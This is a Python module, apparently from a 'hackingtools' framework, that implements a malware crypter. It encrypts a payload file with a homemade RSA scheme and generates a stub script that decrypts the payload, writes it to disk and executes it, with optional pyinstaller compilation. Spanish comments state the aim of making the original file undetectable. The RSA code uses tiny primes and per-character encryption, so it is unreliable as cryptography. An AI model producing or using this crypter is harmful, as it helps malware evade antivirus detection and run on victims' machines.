from hackingtools.core import Logger, Config

import binascii
import sys
from argparse import ArgumentParser
import os.path
import math
from random import randint
import base64
import binascii
import random
config = Config.getConfig(parentKey='modules', key='ht_crypter')

class StartModule():

	def __init__(self):
		Logger.printMessage(message='ht_crypter loaded', debug_module=True)
		pass

	def generate_keypair(self, prime_a, prime_b):
		if not (self.__is_prime__(prime_a) and self.__is_prime__(prime_b)):
			raise ValueError(config['bad_identical_prime'])
		elif prime_a == prime_b:
			raise ValueError(config['p_q_equal_error'])
		#n = pq
		n = prime_a * prime_b

		#Phi is the totient of n
		phi = (prime_a-1) * (prime_b-1)

		#Choose an integer e such that e and phi(n) are coprime
		e = random.randrange(1, phi)

		#Use Euclid's Algorithm to verify that e and phi(n) are comprime
		g = self.__gcd__(e, phi)
		while g != 1:
			e = random.randrange(1, phi)
			g = self.__gcd__(e, phi)

		#Use Extended Euclid's Algorithm to generate the private key
		d = self.__multiplicative_inverse__(e, phi)
		
		#Return public and private keypair
		#Public key is (e, n) and private key is (d, n)
		return ((e, n), (d, n))

	def getRandomKeypair(self):
		prime_a = ''
		prime_b = ''
		while prime_a == prime_b:
			while prime_a == '':
				num = random.randint(random.randint(0,40),random.randint(40,80))*random.randint(1,10)
				if self.__is_prime__(num):
					prime_a = num
			while prime_b == '':
				num = random.randint(random.randint(40,80),random.randint(80,120))*random.randint(1,10)
				if self.__is_prime__(num):
					prime_b = num
		return (prime_a, prime_b)

	def encrypt(self, private_key, plaintext):
		#Unpack the key into it's components
		key, n = private_key
		mensaje = self.__mensajeASCII__(plaintext)
		mensaje1 = [(ord(chr(char)) ** key) % n for char in mensaje]
		mensajeHex = self.__ASCII_Hex__(mensaje1)
		mensajeBase64 = self.__Hex_Base64__(mensajeHex)
		mensajeFinalBase64 = self.__unirBase64__(mensajeBase64)
		return mensajeFinalBase64.decode("utf-8")

	def decrypt(self, public_key, ciphertext):
		#Unpack the key into its components
		key, n = public_key
		mensajeRecibido = self.__recibirBase64__(ciphertext.encode('utf-8'))
		mensajeHexRecibido = self.__Base64_Hex__(mensajeRecibido)
		mensajeDecimalRecibido = self.__Hex_decimal__(mensajeHexRecibido)
		mensajeDescifrado = [((char ** key) % n) for char in mensajeDecimalRecibido]
		mensaje_de_ascii = self.__decimal_ASCII__(mensajeDescifrado)
		return ''.join(mensaje_de_ascii)

	'''
	Euclid's algorithm for determining the greatest common divisor
	Use iteration to make it faster for larger integers
	'''
	def __gcd__(self, a, b):
		while b != 0:
			a, b = b, a % b
		return a

	'''
	Euclid's extended algorithm for finding the multiplicative inverse of two numbers
	'''
	def __multiplicative_inverse__(self, e, phi):
		# See: http://en.wikipedia.org/wiki/Extended_Euclidean_algorithm
		def eea(a,b):
			if b==0:return (1,0)
			(q,r) = (a//b,a%b)
			(s,t) = eea(b,r)
			return (t, s-(q*t) )

		inv = eea(e,phi)[0]
		if inv < 1: inv += phi #we only want positive values
		return inv
	'''
	Tests to see if a number is prime.
	'''
	def __is_prime__(self, num):
		if int(num) == 2:
			return True
		if int(num) < 2 or int(num) % 2 == 0:
			return False
		for n in range(3, int(num**0.5)+2, 2):
			if num % n == 0:
				return False
		return True

	def __mensajeASCII__(self, mensaje):
		men = []
		for palabra in mensaje:
			men.append(ord(palabra))
		return men

	def __ASCII_Hex__(self, mensaje):
		mensajeHex = []
		for numero in mensaje:
			mensajeHex.append(hex(numero)[2:])
		return mensajeHex

	def __Hex_Base64__(self, mensaje):
		mensajeBase64 = []
		for numero in mensaje:
			mensajeBase64.append(base64.b64encode(numero.encode()))
		return mensajeBase64

	def __unirBase64__(self, mensaje):
		msg_base64 = "".encode()
		for i in range(0, len(mensaje)):
			msg_base64 = msg_base64 + mensaje[i]
		return msg_base64

	def __recibirBase64__(self, mensaje):
		msg_base64 = []
		for i in range(0,len(mensaje), 4):
			msg_base64.append(mensaje[i:i+4])
		return msg_base64
		
	def __Base64_Hex__(self, mensaje):
		mensajeHex = []
		for b64 in mensaje:
			mensajeHex.append(base64.b64decode(b64))
		return mensajeHex

	def __Hex_decimal__(self, mensaje):
		mensajeDecimal = []
		for hexa in mensaje:
			hexa = hexa.decode("UTF-8")
			numero = int(hexa, 16)
			mensajeDecimal.append(numero)    
		return mensajeDecimal

	def __decimal_ASCII__(self, mensaje):
		mensaje1 = ""
		for decimal in mensaje:
			mensaje1 = mensaje1 + chr(decimal)
		return mensaje1

	# FIN RSA

	def getMalwareData(self, fileName):
		print(fileName)
		file = open(fileName, "rb")
		file_data = file.read()
		file.close()
		return file_data

	#def cryptData(data, cryptKey):
	#   aes = pyaes.AESModeOfOperationCTR(cryptKey)
	#    crypto_data = aes.encrypt(data)
	#    crypto_data_hex = binascii.hexlify(crypto_data)
	#    return crypto_data_hex

	def convertToExe(self, stub_name):
		# Convert py to exe with pyinstaller
		import os
		os.system(config['pyinstaller'] + " " + stub_name)

	def is_valid_file(self, parser, arg):
		if not os.path.exists(arg):
			parser.error("The file {file} does not exist!".format(file=arg))
		else:
			return arg

	def saveStub(self, stub, save_name):
		# Save the Stub
		stub_name = save_name
		stub_file = open(stub_name, "w")
		stub_file.write(stub)
		stub_file.close()
		print('Stub saved as {file}'.format(file=stub_name))

	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, convert=False):
		# Create Stub in Python File
		stub = "import argparse\nimport math\nfrom random import randint\nimport base64\nimport binascii\nimport random\n"
		stub += "crypto_data_hex = \"" + crypto_data_hex + "\"\n"
		stub += "public_key = ({a}, {b})\n".format(a=public_key[0], b=public_key[1])
		stub += "drop_file_name = \"" + drop_file_name + "\"\n"
		stub += """
# Decrypt
def decrypt(public_key, ciphertext):
	#Unpack the key into its components
	key, n = public_key
	mensajeRecibido = __recibirBase64__(ciphertext.encode('utf-8'))
	mensajeHexRecibido = __Base64_Hex__(mensajeRecibido)
	mensajeDecimalRecibido = __Hex_decimal__(mensajeHexRecibido)
	mensajeDescifrado = [((char ** key) % n) for char in mensajeDecimalRecibido]
	mensaje_de_ascii = __decimal_ASCII__(mensajeDescifrado)
	return ''.join(mensaje_de_ascii)
def __recibirBase64__(mensaje):
	msg_base64 = []
	for i in range(0,len(mensaje), 4):
		msg_base64.append(mensaje[i:i+4])
	return msg_base64
def __Base64_Hex__(mensaje):
	mensajeHex = []
	for b64 in mensaje:
		mensajeHex.append(base64.b64decode(b64))
	return mensajeHex
def __Hex_decimal__(mensaje):
	mensajeDecimal = []
	for hexa in mensaje:
		hexa = hexa.decode("UTF-8")
		numero = int(hexa, 16)
		mensajeDecimal.append(numero)    
	return mensajeDecimal
def __decimal_ASCII__(mensaje):
	mensaje1 = ""
	for decimal in mensaje:
		mensaje1 = mensaje1 + chr(decimal)
	return mensaje1
decrypt_data = decrypt(public_key=public_key, ciphertext=crypto_data_hex)
# Save file
new_file = open(drop_file_name, 'wb')
new_file.write(decrypt_data.encode('utf-8'))
new_file.close()
# Execute file
import subprocess
proc = subprocess.Popen('python {filename}'.format(filename=drop_file_name), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
"""
		self.saveStub(stub, save_name)

		if convert:
			self.convertToExe(save_name)

	def crypt_file(self, filename, new_file_name, drop_file_name, compile_exe=False):
		"""
		filename es el archivo original a indetectar (filename='servidor.py')
		new_file_name es el nombre final del fichero indetectado (new_file_name='indetectable.py')
		drop_file_name es el nombre con el que se guarda trás ejecutarse el stub para poder ejecutarlo (drop_file_name='descifrado_ejecutable.py')
		compile_exe es si queremos compilarlo con pyinstaller
		"""
		if filename and new_file_name:
			data = self.getMalwareData(filename)
			prime_a, prime_b = self.getRandomKeypair()
			public, private = self.generate_keypair(prime_a, prime_b)
			crypted_data = self.encrypt(private_key=private, plaintext=data.decode("utf-8"))
			new_file = new_file_name
			if not '.' in new_file:
				new_file = '{file}.py'.format(file=new_file)
			if compile_exe:
				self.createStub(crypted_data, public, drop_file_name, new_file, True)
			else:
				self.createStub(crypted_data, public, drop_file_name, new_file)
			return new_file
		else:
			return None